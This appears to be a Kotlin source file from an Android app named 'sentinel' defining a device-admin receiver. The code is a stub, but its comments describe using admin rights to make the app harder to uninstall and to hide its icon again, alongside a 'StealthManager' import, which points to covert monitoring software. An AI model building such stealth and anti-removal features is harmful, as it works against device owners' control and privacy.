package com.zero.sentinel.receivers

import android.app.admin.DeviceAdminReceiver
import android.content.Context
import android.content.Intent
import com.zero.sentinel.utils.StealthManager

class SentinelDeviceAdminReceiver : DeviceAdminReceiver() {

    override fun onEnabled(context: Context, intent: Intent) {
        super.onEnabled(context, intent)
        // Admin enabled. We are now harder to uninstall.
    }

    override fun onDisabled(context: Context, intent: Intent) {
        super.onDisabled(context, intent)
        // Admin disabled. User might be trying to uninstall.
        // We could try to hide icon again or do something else, but if they are here, they are persistent.
    }
}
